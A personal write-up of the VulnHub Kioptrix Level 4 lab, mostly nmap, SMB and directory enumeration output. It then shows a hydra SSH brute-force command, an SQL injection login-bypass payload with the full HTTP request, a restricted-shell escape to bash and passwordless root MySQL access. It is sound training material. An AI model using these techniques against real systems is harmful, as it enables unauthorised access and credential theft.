<a href=https://gohugo.io/>Hugo</a></p></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i></a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span><span class=links><a href=/></a>> <a href=/notes/>Notes</a> > <a href=/notes/ctfs/>CTFs</a> > <a href=/notes/ctfs/vulnhub/>VulnHub</a> > <a href=/notes/ctfs/vulnhub/kioptrix/>Kioptrix</a> > Level 4</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><a href=#level4>level4</a><ul><li><a href=#enum>Enum</a></li><li><a href=#expliot>Expliot</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/tags/vulnhub>VulnHub</a></div></div><div id=body-inner><h2 id=level4>level4</h2><table><thead><tr><th>Proto</th><th>port</th><th>Service/URL</th><th>Info</th><th>Potential Vulns</th><th>Verified Vulns</th></tr></thead><tbody><tr><td></td><td></td><td>system</td><td>Ubuntu 8.04.3 LTS Linux 2.6.24-24 Workgroup: WORKGROUP Domain: localdomain FQDN: Kioptrix4.localdomain Account Lockout Threshold: None Users: nobody,robert,root,john,loneferret</td><td><a href=https://github.com/FireFart/dirtycow/blob/master/dirty.c>dirty cow</a></td><td>dirty cow</td></tr><tr><td>TCP</td><td>22</td><td>ssh</td><td>OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</td><td></td><td></td></tr><tr><td>TCP</td><td>80</td><td>http</td><td>Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</td><td></td><td></td></tr><tr><td>UDP</td><td>137</td><td>netbios-ns</td><td>Microsoft Windows netbios-ns (workgroup: WORKGROUP)</td><td></td><td></td></tr><tr><td>TCP</td><td>139</td><td>netbios-ssn</td><td>Samba smbd 3.X - 4.X</td><td></td><td></td></tr><tr><td>TCP</td><td>445</td><td>netbios-ssn</td><td>Samba smbd 3.0.28a print$ - no access IPC$ - Anonymous access</td><td></td><td></td></tr><tr><td></td><td></td><td>mysql</td><td>Running as root.</td><td><a href=https://www.exploit-db.com/exploits/1518>User-Defined Function (UDF) Dynamic Library (2)</a></td><td>UDF</td></tr></tbody></table><h3 id=enum>Enum</h3><h4 id=where-you-at>Where you at</h4><pre><code class=language-bash>nmap -sn -PR 192.168.88.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:15 CET
Nmap scan report for 192.168.88.2
Host is up (0.000070s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.132
Host is up (0.00037s latency).
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Nmap scan report for 192.168.88.254
Host is up (0.00011s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.78 seconds
</code></pre><h4 id=tcp>TCP</h4><pre><code class=language-bash>nmap -p- -A 192.168.88.132 -oA tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:16 CET
Nmap scan report for 192.168.88.132
Host is up (0.00046s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesnt have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m02s, deviation: 3h32m07s, median: 2s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2020-01-04T11:17:19-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.88.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds
</code></pre><h4 id=udp>UDP</h4><pre><code class=language-bash>Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:17 CET
Stats: 0:10:22 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.18% done; ETC: 17:32 (0:05:03 remaining)
Nmap scan report for 192.168.88.132
Host is up (0.00052s latency).
Not shown: 951 closed ports, 48 open|filtered ports
PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: KIOPTRIX4; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.88.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1353.84 seconds
</code></pre><h4 id=19216888132---80>192.168.88.132 - 80</h4><h6 id=gobuster>gobuster</h6><pre><code class=language-bash>~/go/bin/gobuster dir -u http://192.168.88.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql  -t 40 -e
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.132
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt,sql
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/04 20:54:38 Starting gobuster
===============================================================
http://192.168.88.132/images (Status: 301)
http://192.168.88.132/index (Status: 200)
http://192.168.88.132/index.php (Status: 200)
http://192.168.88.132/member (Status: 302)
http://192.168.88.132/member.php (Status: 302)
http://192.168.88.132/database.sql (Status: 200)
http://192.168.88.132/logout (Status: 302)
http://192.168.88.132/logout.php (Status: 302)
http://192.168.88.132/john (Status: 301)
http://192.168.88.132/robert (Status: 301)
http://192.168.88.132/server-status (Status: 403)
===============================================================
2020/01/04 20:55:52 Finished
===============================================================
</code></pre><p><code>http://192.168.88.132/database.sql</code></p><pre><code class=language-sql>CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

--
-- Dumping data for table `members`
--

INSERT INTO `members` VALUES (1, 'john', '1234');
</code></pre><h4 id=19216888132---139445>192.168.88.132 - 139/445</h4><h6 id=smbclient>smbclient</h6><pre><code class=language-bash>smbclient -L \\\\192.168.88.132\\
Enter WORKGROUP\root's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4

</code></pre><pre><code class=language-bash>smbclient \\\\192.168.88.132\\IPC$
Enter WORKGROUP\root's password:
Anonymous login successful
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
</code></pre><pre><code>smbclient \\\\192.168.88.132\\print$
Enter WORKGROUP\root's password:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
</code></pre><h6 id=enum4linux>enum4linux</h6><pre><code class=language-bash>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan  4 20:15:14 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.88.132
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================
|    Enumerating Workgroup/Domain on 192.168.88.132    |
 ======================================================
[+] Got domain/workgroup name: WORKGROUP

 ==============================================
|    Nbtstat Information for 192.168.88.132    |
 ==============================================
Looking up status of 192.168.88.132
        KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
        KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
        KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name

        MAC Address = 00-00-00-00-00-00

 =======================================
|    Session Check on 192.168.88.132    |
 =======================================
[+] Server 192.168.88.132 allows sessions using username '', password ''

 =============================================
|    Getting domain SID for 192.168.88.132    |
 =============================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Cant determine if host is part of domain or part of a workgroup

 ========================================
|    OS information on 192.168.88.132    |
 ========================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.88.132 from smbclient:
[+] Got OS info for 192.168.88.132 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x809a03

 ===============================
|    Users on 192.168.88.132    |
 ===============================
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 ===========================================
|    Share Enumeration on 192.168.88.132    |
 ===========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4

[+] Attempting to map shares on 192.168.88.132
//192.168.88.132/print$ Mapping: DENIED, Listing: N/A
//192.168.88.132/IPC$   [E] Cant understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ======================================================
|    Password Policy Information for 192.168.88.132    |
 ======================================================


[+] Attaching to 192.168.88.132 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] KIOPTRIX4
        [+] Builtin

[+] Password Info for Domain: KIOPTRIX4

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ================================
|    Groups on 192.168.88.132    |
 ================================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 =========================================================================
|    Users on 192.168.88.132 via RID cycling (RIDS: 500-550,1000-1050)    |
 =========================================================================
[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)
[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
S-1-5-21-2529228035-991147148-3991031631-500 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-502 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-503 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-504 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-505 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-506 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-507 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-508 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-509 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-510 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-511 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-512 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-514 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-515 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-516 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-517 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-518 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-519 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-520 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-521 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-522 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-523 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-524 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-525 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-526 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-527 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-528 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-529 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-530 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-531 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-532 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-533 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-534 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-535 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-536 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-537 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-538 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-539 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-540 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-541 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-542 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-543 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-544 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-545 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-546 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-547 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-548 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-549 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-550 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)
S-1-5-21-2529228035-991147148-3991031631-1001 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1002 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1003 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1004 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1005 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1006 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1007 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1008 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1009 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1010 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1011 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1012 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1013 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1014 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1015 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1016 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1017 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1018 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1019 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1020 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1021 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1022 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1023 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1024 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1025 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1026 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1027 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1028 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1029 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1030 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1031 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1032 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1033 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1034 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1035 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1036 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1037 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1038 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1039 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1040 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1041 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1042 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1043 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1044 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1045 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1046 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1047 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1048 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1049 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1050 *unknown*\*unknown* (8)

 ===============================================
|    Getting printer info for 192.168.88.132    |
 ===============================================
No printers returned.


enum4linux complete on Sat Jan  4 20:15:51 2020
</code></pre><h3 id=expliot>Expliot</h3><h4 id=brute-force>brute-Force</h4><pre><code class=language-bash>user list:

john
robert
loneferret
root
nobody

hydra -v -V -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8

....

1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-04 22:09:17

</code></pre><h4 id=sqliauth-bypass>SQLi/Auth bypass</h4><p><code>http://192.168.88.132/checklogin.php</code></p><p>user: someuser
pass: ' OR &lsquo;1'='1&rsquo; #&ndash;</p><pre><code class=language-bash>POST /checklogin.php HTTP/1.1
Host: 192.168.88.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.88.132/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Connection: close
Cookie: PHPSESSID=f3422deb5013adf1dd1883936619abbf
Upgrade-Insecure-Requests: 1

myusername=admin&amp;mypassword=%27+OR+%271%27%3D%271%27+%23--&amp;Submit=Login
</code></pre><p>user: robert
pass: ' OR &lsquo;1'='1&rsquo; #&ndash;</p><p>Member&rsquo;s Control Panel<br>Username : robert<br>Password : ADGAdsafdfwt4gadfga==</p><h4 id=ssh>SSH</h4><h6 id=escape>Escape</h6><pre><code class=language-bash>ssh robert@192.168.88.132
robert@192.168.88.132's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ echo os.system(&quot;/bin/bash&quot;)
</code></pre><pre><code class=language-bash>robert@Kioptrix4:~$
robert@Kioptrix4:~$ cat /var/www/john/john.php
&lt;?php
session_start();
if(!session_is_registered(myusername)){
        header(&quot;location:../index.php&quot;);
}else{
ob_start();
$host=&quot;localhost&quot;; // Host name
$username=&quot;root&quot;; // Mysql username
$password=&quot;&quot;; // Mysql password
$db_name=&quot;members&quot;; // Database name
$tbl_name=&quot;members&quot;; // Table name
...

mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

